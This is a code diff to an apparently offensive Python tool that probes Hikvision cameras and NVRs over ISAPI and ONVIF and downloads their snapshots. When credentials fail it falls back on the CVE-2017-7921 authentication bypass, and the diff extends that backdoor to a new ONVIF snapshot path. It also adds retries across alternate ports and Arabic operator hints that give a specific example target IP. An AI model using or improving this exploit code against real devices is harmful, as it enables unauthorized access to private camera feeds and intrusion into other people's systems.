@@ -68,7 +68,41 @@ _PLACEHOLDER_HINTS = (
     "ip_here",
 )
 
-_PROBE_PORTS = (80, 443, 8000, 8080, 554)
+_PROBE_PORTS = (8000, 80, 443, 8080, 554)
+
+
+def is_jpeg(content: bytes) -> bool:
+    return bool(content) and content[:2] == b"\xff\xd8" and len(content) >= 500
+
+
+def is_html_login_page(content: bytes) -> bool:
+    if not content or len(content) > 8000:
+        return False
+    head = content[:1200].lower()
+    return b"<html" in head or b"<!doctype" in head or b"login.asp" in head
+
+
+def is_isapi_xml(content: bytes) -> bool:
+    """True when body looks like Hikvision ISAPI XML, not an HTML login shell."""
+    if not content or len(content) < 24:
+        return False
+    if is_jpeg(content):
+        return True
+    if is_html_login_page(content):
+        return False
+    text = content[:4000].decode("utf-8", errors="ignore").lower()
+    return any(
+        marker in text
+        for marker in (
+            "<deviceinfo",
+            "deviceinfo>",
+            "statusvalue>200",
+            "<isapi",
+            "<?xml",
+            "<userlist",
+            "firmwareversion",
+        )
+    )
 
 
 def validate_host(host: str) -> str | None:
@@ -115,6 +149,14 @@ def _isapi_request(
         return None
 
 
+def _probe_port_order(port_hint: int | None) -> list[int]:
+    """Hikvision ISAPI is usually on 8000; 80 may be a router/ZyXEL front page."""
+    ports: list[int] = list(_PROBE_PORTS)
+    if port_hint and port_hint not in ports:
+        ports.insert(0, port_hint)
+    return ports
+
+
 def find_isapi_base(
     host: str,
     auth: tuple[str, str],
@@ -126,12 +168,7 @@ def find_isapi_base(
     """Return (base_url, message, use_backdoor)."""
     session = requests.Session()
     tried: list[str] = []
-    ports: list[int] = []
-    if port_hint:
-        ports.append(port_hint)
-    for p in _PROBE_PORTS:
-        if p not in ports:
-            ports.append(p)
+    ports = _probe_port_order(port_hint or None)
 
     for use_backdoor in (False, True):
         for port in ports:
@@ -140,7 +177,7 @@ def find_isapi_base(
                 schemes.append(False)
             for use_https in schemes:
                 base = _base_url(host, port, use_https)
-                url = f"{base}/ISAPI/System/DeviceInfo"
+                url = f"{base}/ISAPI/System/deviceInfo"
                 if not use_backdoor:
                     if url in tried:
                         continue
@@ -148,10 +185,12 @@ def find_isapi_base(
                 response = _isapi_request(session, url, auth, timeout, use_backdoor=use_backdoor)
                 if response is None:
                     continue
-                if response.status_code == 200:
+                if response.status_code == 200 and is_isapi_xml(response.content):
                     if use_backdoor:
                         return base, f"ISAPI via CVE-2017-7921 backdoor on {base}", True
-                    return base, f"اتصال ناجح على {base}", False
+                    return base, f"ISAPI OK on {base} (real XML, not login page)", False
+                if response.status_code == 200 and is_html_login_page(response.content):
+                    continue
                 if response.status_code == 401 and not use_backdoor:
                     continue
                 if response.status_code == 404:
@@ -312,9 +351,13 @@ def probe_snapshot(
         return SnapshotResult(None, "401 Unauthorized")
     if response.status_code == 404:
         return SnapshotResult(None, "404")
-    if response.status_code == 200 and response.content and len(response.content) > 500:
-        if response.content[:2] == b"\xff\xd8" or "image" in (response.headers.get("Content-Type") or "").lower():
+    if response.status_code == 200 and response.content:
+        if is_jpeg(response.content):
             return SnapshotResult(response.content)
+        if is_html_login_page(response.content):
+            return SnapshotResult(None, "HTTP 200 but HTML login page (wrong port/service?)")
+        if len(response.content) < 500:
+            return SnapshotResult(None, f"HTTP 200 but too small ({len(response.content)} bytes)")
     return SnapshotResult(None, f"HTTP {response.status_code}")
 
 
@@ -357,6 +400,37 @@ def discover_streams(
     return streams, inputs, dev
 
 
+def try_onvif_jpeg_snapshot(
+    host: str,
+    auth: tuple[str, str],
+    *,
+    port: int = 80,
+    use_backdoor: bool = False,
+    timeout: float = 15.0,
+) -> SnapshotResult:
+    """Single-frame /onvif-http/snapshot — often works when ISAPI channel scan returns HTML."""
+    session = requests.Session()
+    session.headers["User-Agent"] = "hikvision-snapshot/2.0"
+    base = _base_url(host, port, False)
+    url = f"{base}/onvif-http/snapshot"
+    if use_backdoor:
+        url = f"{url}?auth={HIKVISION_BACKDOOR_AUTH}"
+    try:
+        if use_backdoor:
+            r = session.get(url, timeout=timeout, verify=False)
+        else:
+            r = session.get(
+                url, auth=hikvision_digest_auth(auth[0], auth[1]), timeout=timeout, verify=False
+            )
+        if r.status_code == 200 and is_jpeg(r.content):
+            return SnapshotResult(r.content)
+        if r.status_code == 200 and is_html_login_page(r.content):
+            return SnapshotResult(None, "onvif snapshot returned HTML login page")
+        return SnapshotResult(None, f"onvif HTTP {r.status_code} ({len(r.content)} bytes)")
+    except requests.RequestException as exc:
+        return SnapshotResult(None, str(exc))
+
+
 def download_all_snapshots(
     host: str,
     username: str,
@@ -377,6 +451,16 @@ def download_all_snapshots(
     auth = (username, password)
     base, conn_msg, use_backdoor = find_isapi_base(host, auth, port_hint=port, https=https, timeout=timeout)
     if not base:
+        for alt in _probe_port_order(port):
+            if alt == port:
+                continue
+            base, conn_msg, use_backdoor = find_isapi_base(
+                host, auth, port_hint=alt, https=https, timeout=timeout
+            )
+            if base:
+                port = alt
+                break
+    if not base:
         print(f"[X] {conn_msg}")
         return []
     print(f"[*] {conn_msg}\n")
@@ -388,6 +472,20 @@ def download_all_snapshots(
     out.mkdir(parents=True, exist_ok=True)
 
     streams, inputs, dev = discover_streams(session, base, auth, timeout, use_backdoor=use_backdoor)
+
+    saved: list[Path] = []
+
+    onvif = try_onvif_jpeg_snapshot(host, auth, port=port, use_backdoor=use_backdoor, timeout=timeout)
+    if onvif.data:
+        path = out / "onvif_snapshot.jpg"
+        path.write_bytes(onvif.data)
+        saved.append(path)
+        print(f"[+] ONVIF snapshot -> {path.name}")
+        stream_ids = pick_snapshot_stream_ids(streams)
+        if not stream_ids:
+            print(f"\n[=] كاميرات/مشاهد **فريدة**: 1 صورة في {out.resolve()}\n")
+            return saved
+        print("[*] ISAPI streams detected — fetching channel pictures too...")
 
     if dev:
         print(f"[*] الجهاز: {dev.device_name} | النوع: {dev.device_type} | الطراز: {dev.model}")
@@ -427,10 +525,10 @@ def download_all_snapshots(
 
     print(f"[*] جلب لقطات لـ {len(to_fetch)} بث/مدخل (وليس 24 تلقائياً على كاميرا واحدة)\n")
 
-    saved: list[Path] = []
     seen_fp: dict[str, int] = {}
 
     first_err: str | None = None
+    html_streak = 0
     for s in to_fetch:
         res = probe_snapshot(session, base, s.stream_id, auth, timeout, use_backdoor=use_backdoor)
         if res.data is None:
@@ -438,7 +536,16 @@ def download_all_snapshots(
             if first_err is None:
                 first_err = err
             print(f"[-] stream {s.stream_id} ({s.name}) — {err}")
+            if "login page" in (err or "").lower() or "too small" in (err or "").lower():
+                html_streak += 1
+                if html_streak >= 3 and not force_scan:
+                    print(
+                        "[!] توقف — الردود صفحة ويب وليست JPEG ISAPI. "
+                        "جرّب المنفذ 8000 أو ضع admin:PASSWORD في شريط الهدف."
+                    )
+                    break
             continue
+        html_streak = 0
 
         data = res.data
         fp = content_fingerprint(data)
@@ -462,6 +569,16 @@ def download_all_snapshots(
     print(f"[=] كاميرات/مشاهد **فريدة**: {unique} صورة في {out.resolve()}")
     if unique == 0 and first_err:
         print(f"[!] سبب محتمل لكل الفشل: {first_err}")
+        for alt_port in _probe_port_order(port):
+            if alt_port == port:
+                continue
+            alt = try_onvif_jpeg_snapshot(host, auth, port=alt_port, use_backdoor=use_backdoor, timeout=timeout)
+            if alt.data:
+                path = out / f"onvif_snapshot_port{alt_port}.jpg"
+                path.write_bytes(alt.data)
+                saved.append(path)
+                print(f"[+] ONVIF snapshot on port {alt_port} -> {path.name}")
+                break
     if unique <= 1 and is_single_ipcam:
         print("[=] للحصول على باقي الكاميرات: شغّل السكربت مع IP جهاز الـ NVR/DVR، مثال: -H 1.178.133.180")
     return saved
